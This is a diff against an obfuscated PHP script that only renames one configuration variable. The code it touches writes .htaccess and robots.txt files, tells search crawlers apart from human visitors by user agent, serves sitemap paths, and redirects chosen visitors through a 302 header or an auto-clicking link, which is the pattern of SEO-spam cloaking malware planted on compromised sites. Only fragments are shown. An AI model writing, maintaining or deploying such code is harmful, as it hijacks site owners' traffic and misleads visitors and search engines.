@@ -159,7 +159,7 @@ $l1imRR = $param8 = 0;
 $param4 = "";
 $param5 = "";
 $param6 = ".";
-$l1bS3es = $l1o7fR = $l1M = $l1EbALe = $l1h = $l1Z4k = $l1Ni6 = $param7 = "";
+$l1bS3es = $l1o7fR = $l1M = $param9 = $l1h = $l1Z4k = $l1Ni6 = $param7 = "";
 $l1T2 = $l1gfDiJL = $l1NhADdH = $l1h1 = $l135vXS = $l1bhL8Zi = $l1GH0rfZ = array();
 //$l1I = $_SERVER["DOCUMENT_ROOT"];
 
@@ -761,7 +761,7 @@ function l1P9LVD($l15tGX=''){
     write_htaccess();
 
     // Config variables
-    global $param1,$param2,$param3,$param4,$param5,$param6,$param7,$param8,$l1EbALe,$l1h;
+    global $param1,$param2,$param3,$param4,$param5,$param6,$param7,$param8,$param9,$l1h;
     global $l135vXS,$l1bhL8Zi,$l1NhADdH,$l1h1,$l1gfDiJL,$l1T2,$l1imRR,$l1GH0rfZ,$l1bS3es,$l1M,$l1o7fR,$l1I,$l1Ni6,$l1Z4k;
 
     write_robots_txt($_SERVER["DOCUMENT_ROOT"]);
@@ -813,7 +813,7 @@ function l1P9LVD($l15tGX=''){
                     );
 
 
-    list($param1,$param2,$param3,$param4,$param5,$param6,$param7,$param8,$l1EbALe,$l1h) = $config_params;
+    list($param1,$param2,$param3,$param4,$param5,$param6,$param7,$param8,$param9,$l1h) = $config_params;
 
     print_r($config_params);
 
@@ -831,12 +831,12 @@ function l1P9LVD($l15tGX=''){
     $l1T2 = isset($l1h[1])?explode(',',$l1h[1]):array();
     $l13dbLD = $param1;
     $l19 = $param2;
-    $l1c = $l1EbALe;
+    $l1c = $param9;
     $param8 = preg_split('//',$param8,-1,PREG_SPLIT_NO_EMPTY);
-    $l1EbALe = preg_split('//',$l1EbALe,-1,PREG_SPLIT_NO_EMPTY);
+    $param9 = preg_split('//',$param9,-1,PREG_SPLIT_NO_EMPTY);
     $param8 = count($param8) !=4 ? array(1,1,1,0):$param8;
-    $l1EbALe = count($l1EbALe)!=9?array(1,0,1,1,0,1,0,0,0):$l1EbALe;
-    $l1f1oojq = sprintf("http%s://$l13K",l1UT7($l1EbALe[8]));
+    $param9 = count($param9)!=9?array(1,0,1,1,0,1,0,0,0):$param9;
+    $l1f1oojq = sprintf("http%s://$l13K",l1UT7($param9[8]));
     $l1qv = str_replace("www.",'',$l13K);
 
     $l1ekHESi = $l1c9 = isset($_SERVER["REQUEST_URI"])?$_SERVER["REQUEST_URI"]:(isset($_SERVER["QUERY_STRING"])?$_SERVER["QUERY_STRING"]:'');
@@ -986,7 +986,7 @@ function l1P9LVD($l15tGX=''){
     $l13c=isset($_SERVER["HTTP_USER_AGENT"])?$_SERVER["HTTP_USER_AGENT"]:'';
     $l13=l1AZ($l13c,$l1ST2);
     $l1aj=l1gVD2yX();
-    $l1p38K=$l1EbALe[7]==0?$l1aj:($l1EbALe[7]==1?$l13:1);
+    $l1p38K = $param9[7]==0?$l1aj:($param9[7]==1?$l13:1);
     $l1bgn=($l1aj||$l13)?0:l1Qw8rL($l1pOeVk);
     $l1t=false;
     $l18="jpsitemap|mapxml";
@@ -1281,26 +1281,26 @@ function l1P9LVD($l15tGX=''){
     $l1WyZOKd=0;
     if(!$l1nzHzs){
     $param2 = !$l1uH ? l1J('',$l1uH,$l1v,"$l1xj0grt|$l1CEqH4") : $param2;
-    if($l1EbALe[7]==2&&!$l1aj){
+    if($param9[7]==2&&!$l1aj){
     $l1WyZOKd=1;
     }else{
     if($l1uH){
     if($l1p38K){
-    if(!$l1EbALe[0]){
+    if(!$param9[0]){
     $l1WyZOKd=1;
     }}if($l1bgn){
-    if(!$l1EbALe[1]){
+    if(!$param9[1]){
     $l1bgn=0;
-    }if(!$l1EbALe[2]){
+    }if(!$param9[2]){
     $l1WyZOKd=1;
     }}}else{
     if($l1p38K){
-    if(!$l1EbALe[3]){
+    if(!$param9[3]){
     $l1WyZOKd=1;
     }}if($l1bgn){
-    if(!$l1EbALe[4]){
+    if(!$param9[4]){
     $l1bgn=0;
-    }if(!$l1EbALe[5]){
+    }if(!$param9[5]){
     $l1WyZOKd=1;
     }}}}}else{
     $l1FWjrO=l15w($param1,$param2,$l1B3[1]);
@@ -1348,7 +1348,7 @@ function l1P9LVD($l15tGX=''){
     }
 
     if(preg_match("/^https?\:\/\//",$l1Kr)){
-        if($l1EbALe[6]){
+        if($param9[6]){
             header("Location:$l1Kr",true,302);
         }else{
             echo sprintf('<body onload="document.getElementsByTagName(%sa%s)[0].click()"><a href="%s"></a><noscript><meta http-equiv="refresh" content="0; url=%s" /></noscript></body>',"'","'",$l1Kr,$l1Kr);
